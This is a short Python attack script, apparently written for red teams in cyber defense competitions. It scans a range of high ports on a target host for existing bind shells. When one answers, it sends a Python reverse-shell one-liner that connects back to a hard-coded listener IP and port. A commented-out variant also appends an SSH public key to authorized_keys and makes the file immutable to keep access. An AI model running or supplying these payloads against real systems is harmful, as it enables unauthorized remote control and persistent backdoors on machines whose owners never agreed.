'''
Many times in CDCs there are random bind shells on high ports.
This script will attempt to brute force which port the bind shell
is on and run a command if successful.
'''

import socket
import sys
from multiprocessing import Pool


def hunt_bind_shells(r_port):
    l_host = '10.1.134.74'
    l_port = '5555'
    # create a new socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    ssh_pub_key = "mkdir .ssh; touch .ssh/authorized_keys; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDW/ZvZOpw4lRe3ISgOzklUpZersY+DOYUY78BuXCBDbeZt6uUwGb36Pq+4fCDxyWA2OfNOu5XdYQCl+p1u4GgHp+GW2fKLhjhcWmw2N/Kye/zv7nSFMQLYRS5zLsF05FuRHXmx5Fjs2jD7m49/FM0hmQmHfkBXwcaVmatcl7FoZtg/5KOq5XuDMXJnG1IGka2D9/frXYMKrYlfHfEUEJWnRN2TU0e+IkPUcPNehM4qayRulzxwlGySeDDOAMiV28H+f41dQFNst5UvkRvTXtq+Be20z1spAZiO/9aDKeU2IzMo+2fAsYlf7g64sqqbXaTz1gp59iuR7oixAnR5dAoV >> .ssh/authorized_keys; chattr +i .ssh/authorized_keys"
    python3_reverse = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    python_reverse = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    # add a pub key & a reverse shell
    # payload = ssh_pub_key + "; " + python3_reverse + "\n"
    # just a reverse shell
    payload = python3_reverse + "\n"
    try:
        s.connect((host, r_port))
        print(green + "Winner {0} {1}".format(host, r_port) + end_color)
        print(blue + "Go get your Shellz!" + end_color)
        s.send(payload.encode())
        data = s.recv(1024)
        print(data)
        s.close()
        exit()

    except socket.error as e:
        print(red + "{0} {1} ".format(host, r_port) + str(e) + end_color)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python3 ' + sys.argv[0] + ' host threads')
        sys.exit(0)


    # Declare some colors to use
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end_color = '\033[0m'

    # Assign arguments to more meaningful variables
    host = sys.argv[1]
    threads = int(sys.argv[2])

    with Pool(threads) as p:
        p.map(hunt_bind_shells, range(65000, 65020))

    p.close()






